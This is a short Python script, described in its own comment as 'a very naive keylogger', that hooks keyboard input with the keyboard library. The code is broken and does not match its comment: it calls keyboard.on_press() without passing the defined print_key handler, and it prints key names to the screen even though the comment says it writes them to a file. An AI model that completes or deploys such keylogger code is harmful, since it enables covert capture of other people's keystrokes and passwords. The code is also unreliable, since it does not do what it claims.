# A very naive keylogger! Starts listening to input and writes everything out to a file.

import keyboard

def print_key(e):
    print(e.name)
    
keyboard.on_press()
keyboard.wait()